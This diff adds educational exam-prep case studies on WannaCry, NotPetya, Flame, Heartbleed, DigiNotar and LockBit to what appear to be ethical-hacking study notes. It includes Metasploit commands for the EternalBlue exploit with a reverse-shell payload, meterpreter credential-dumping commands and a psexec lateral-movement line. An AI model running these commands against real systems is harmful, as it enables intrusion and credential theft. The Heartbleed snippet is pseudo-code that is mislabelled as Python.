@@ -1262,6 +1262,145 @@ meterpreter > screenshot
 | **SSL Stripping** | HTTPS downgrade | HSTS header |
 | **SHA-1 Collision** | Hash integrity | Use SHA-2/SHA-3 |
 
+## Real-World Case Studies for Exam
+
+### Case Study 1: EternalBlue Exploitation — The WannaCry Ransomware (2017)
+**The Incident**: WannaCry infected **300,000+ computers** across 150 countries in 4 days, causing **$4+ billion** in damages. The UK's National Health Service (NHS) was hit hardest — hospitals cancelled surgeries, ambulances were diverted, and patient records were locked.
+
+**The Exploit Chain**:
+| Phase | Detail |
+|-------|--------|
+| **Vulnerability** | MS17-010 (EternalBlue) — SMB remote code execution in Windows |
+| **Exploit Origin** | Developed by NSA, stolen by Shadow Brokers, leaked publicly April 2017 |
+| **Exploit Mechanism** | Buffer overflow in SMBv1 — allows attacker to execute arbitrary code on target |
+| **Payload** | WannaCry ransomware — encrypts files, demands $300-600 Bitcoin ransom |
+| **Propagation** | Self-propagating worm — scans random IPs for vulnerable SMB, exploits automatically |
+| **Kill Switch** | 22-year-old UK researcher registered a domain hardcoded in the malware — stopped the spread |
+
+**Metasploit Connection**: The same EternalBlue exploit is available in Metasploit as `exploit/windows/smb/ms17_010_eternalblue`. An ethical hacker could use it to:
+```bash
+msf > use exploit/windows/smb/ms17_010_eternalblue
+msf > set RHOSTS target-ip
+msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf > exploit
+```
+— but ethically, with permission and for defensive purposes.
+
+**Why It Matters for Cryptography**:
+- WannaCry used **AES-128** to encrypt files and **RSA-2048** to protect the AES key.
+- This is a textbook example of **hybrid encryption**: symmetric (AES) for speed + asymmetric (RSA) for key exchange.
+- If AES had a backdoor or RSA was broken, the ransomware would have been ineffective.
+
+**Exam Tip**: WannaCry is the perfect intersection of Exploitation (Metasploit/EternalBlue) and Cryptography (AES + RSA in ransomware). Use it for "Explain how cryptography secures ransomware" or "How does Metasploit enable exploitation?"
+
+### Case Study 2: The NotPetya Attack (2017) — Exploitation with Lateral Movement
+**The Incident**: NotPetya (actually a wiper, not ransomware) used the **same EternalBlue exploit** as WannaCry but also added **credential theft** via Mimikatz to spread. It caused **$10+ billion** in damages globally, destroyed systems at Maersk (shipping giant), Merck (pharma), FedEx, and Saint-Gobain. Maersk alone lost $300M — its entire global IT infrastructure had to be rebuilt.
+
+**Exploitation Techniques Used**:
+| Technique | Implementation |
+|-----------|----------------|
+| **EternalBlue (MS17-010)** | Same SMB exploit as WannaCry — worm-like propagation |
+| **Credential Dumping** | Used **Mimikatz** to extract plaintext credentials from LSASS memory |
+| **WMI/PsExec** | Lateral movement using stolen credentials via Windows Management Instrumentation |
+| **SMB Propagation** | Spread to all reachable Windows machines using stolen admin credentials |
+| **MFT Encryption** | Overwrote Master File Table (MFT) — making entire drives unrecoverable |
+
+**Metasploit Techniques Illustrated**:
+```bash
+# Credential dumping (mimikatz via meterpreter)
+meterpreter > load kiwi
+meterpreter > creds_all              # Dump all credentials
+meterpreter > lsa_dump_secrets       # Dump LSA secrets
+
+# Lateral movement (similar to Post-Exploitation in Metasploit)
+# Using stolen credentials to access other machines
+psexec \\\\target -u admin -p pass -s cmd.exe
+```
+
+**Exam Tip**: NotPetya is the best case study for explaining "Lateral movement" and "Credential dumping" in post-exploitation. It also shows the devastating impact when exploitation + credential theft are combined.
+
+### Case Study 3: Cryptographic Failure — The Hash Collision That Forged Flame Malware (2012)
+**The Incident**: The **Flame malware** (discovered 2012, attributed to US/Israel operations against Iran) used a **chosen-prefix collision attack on MD5** to forge a Microsoft digital certificate. This allowed Flame to sign malicious code as if it came from Microsoft — Windows trusted it completely.
+
+**Technical Details**:
+| Cryptographic Element | How It Was Broken |
+|-----------------------|-------------------|
+| **MD5 Hash** | Researchers (Sotirov et al.) demonstrated a **chosen-prefix collision** — generate two different inputs with the same MD5 hash |
+| **Digital Signature** | Microsoft's Terminal Server Licensing certificate used MD5 for signing |
+| **Forged Certificate** | Attackers created a rogue certificate that produced the same MD5 hash as the legitimate Microsoft certificate |
+| **Result** | Flame malware installed via Windows Update mechanism — signed with forged certificate |
+
+**Ethical Hacking Lesson**: This case proves that **MD5 is completely broken** for security applications. The attack cost ~$50,000 in GPU time in 2008 — by 2012, the Flame team had operationalized it. This is why modern systems use SHA-256 or stronger for code signing.
+
+**Exam Tip**: When asked "Why is MD5 considered broken?" or "Explain hash collision attacks," quote Flame malware's MD5 forgery of Microsoft certificates. It is the most dramatic real-world hash collision attack.
+
+### Case Study 4: The Heartbleed Attack (2014) — Private Key Theft via Cryptographic Flaw
+**The Incident**: Heartbleed (CVE-2014-0160) was a vulnerability in **OpenSSL's Heartbeat** extension. It allowed attackers to read **64KB of server memory** with a single request — without leaving traces. This memory could contain private keys, passwords, session tokens, or credit card numbers.
+
+**Cryptographic Impact**:
+- **Private Key Theft**: Attackers could read the server's RSA private key from memory — allowing them to decrypt all past and future traffic (breaking confidentiality).
+- **Entire PKI Compromised**: Even if a server patched Heartbleed, if the private key was stolen before patching, all past communications could be decrypted.
+- **Massive Revocation**: Millions of SSL certificates had to be revoked and re-issued — one of the largest PKI events in history.
+
+**How Heartbleed Exploitation Works (Buffer Overflow)**:
+```python
+# Normal heartbeat request
+Client → Server: "ECHO hello" (length = 5)
+Server → Client: "hello" (echoes 5 bytes)
+
+# Malicious heartbeat request
+Client → Server: "ECHO hi" (length = 65535)
+Server → Client: "hi" + (65533 bytes of server memory!)
+```
+
+**Why It Matters for Cryptography**: Heartbleed shows that **even perfect cryptography (AES-256, RSA-4096) is useless if the key is stolen**. Security depends on the entire system — key storage, memory safety, and implementation correctness — not just the algorithm strength.
+
+**Exam Tip**: Heartbleed is the best example for "Why implementation flaws are as dangerous as algorithmic flaws" and "What is a side-channel/key leakage attack?"
+
+### Case Study 5: The DigiNotar CA Breach (2011) — PKI Failure
+**The Incident**: DigiNotar, a Dutch Certificate Authority, was hacked in 2011. Attackers issued **fake certificates** for Google, Yahoo, Mozilla, and other major domains. These fake certificates were then used for **MITM attacks** targeting Iranian dissidents and Gmail users. When discovered, DigiNotar was immediately distrusted by all major browsers — the company went bankrupt within weeks.
+
+**Attack Breakdown**:
+| PKI Component | How It Was Compromised |
+|---------------|------------------------|
+| **CA Server** | Attacker gained access to DigiNotar's CA servers — all 8 CA servers were on the same network! |
+| **Certificate Signing** | Attacker issued 531 rogue certificates for domains they did not control |
+| **Validation Failure** | No RA verification — certificates were issued without domain ownership verification |
+| **Revocation Failure** | CRL and OCSP were not properly updated — browsers continued to trust for months |
+| **Trust Store** | All major browsers had to push emergency updates to remove DigiNotar's root certificate |
+
+**Ethical Hacking Lesson**: PKI is only as strong as the weakest CA. A single compromised CA can break security for the entire internet. This is why **Certificate Transparency** (public log of all issued certificates) and **Certificate Pinning** were developed.
+
+**Exam Tip**: DigiNotar is the #1 case study for "Explain CA compromise attacks" and "Why is PKI trust vulnerable?" in ethical hacking exams.
+
+### Case Study 6: Modern Ransomware — LockBit and Triple Extortion (2023-2024)
+**The Incident**: LockBit is one of the most prolific ransomware-as-a-service (RaaS) groups. By 2024, they had attacked **2,000+ victims** worldwide, demanding ransoms from $50,000 to $80 million. They use **triple extortion**:
+1. **Encrypt** files and demand ransom for decryption key
+2. **Threaten to leak** stolen data publicly
+3. **DDoS** the victim's systems if they don't pay
+
+**Exploitation Techniques**:
+| Technique | How LockBit Uses It |
+|-----------|-------------------|
+| **Initial Access** | Phishing, RDP brute-force, unpatched VPNs (Citrix, Palo Alto) |
+| **Credential Theft** | Mimikatz to dump LSASS credentials |
+| **Lateral Movement** | PsExec, WMI, SMB — same techniques as NotPetya |
+| **Privilege Escalation** | Kernel vulnerabilities, UAC bypass |
+| **Data Exfiltration** | Steal sensitive data before encryption (for double extortion) |
+| **Persistence** | Scheduled tasks, service installation |
+| **Covering Tracks** | Delete shadow copies, event logs, disable recovery |
+
+**Defense (Using Ethical Hacking Principles)**:
+- **Vulnerability Scanning**: Identify and patch VPN/appliance vulnerabilities before attackers find them
+- **Network Segmentation**: Limit lateral movement — attacker on one workstation should not reach backup servers
+- **MFA**: Prevent RDP brute-force — LockBit's #1 initial access vector
+- **Offline Backups**: Immutable, offline backups that ransomware cannot encrypt
+- **Incident Response Plan**: Practice detection and containment via red team exercises
+
+**Exam Tip**: LockBit is the most current ransomware example. Use it to answer "Explain modern ransomware techniques" and "How can ethical hacking prevent ransomware?"
+
+---
+
 ### Sample 5-Mark Questions (SPPU Pattern)
 
 1. **Explain the architecture of Metasploit Framework with a block diagram.**
